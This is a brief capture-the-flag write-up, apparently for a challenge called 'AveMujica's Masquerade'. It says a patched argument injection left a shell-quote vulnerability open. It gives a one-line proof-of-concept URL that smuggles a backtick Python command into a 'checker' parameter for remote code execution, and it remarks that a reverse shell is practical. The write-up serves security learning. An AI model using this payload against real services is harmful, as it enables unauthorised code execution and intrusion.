# AveMujica's Masquerade

## Description
...  

## Info
"Fixed" the argument injection vulnerability. But introduced CVE-2023-30589 in `shell-quote@1.7.2`.  
PoC: `checker?url=1:`:`python3$IFS-c$IFS\\open(chr(8%2B48),chr(22%2B97)).write(chr(95))``:%23`
RCE is available, and Python can be used for advanced post-exploitation.

---

Unexpected: the net is NOT an intranet actually. Reverse shell is practical.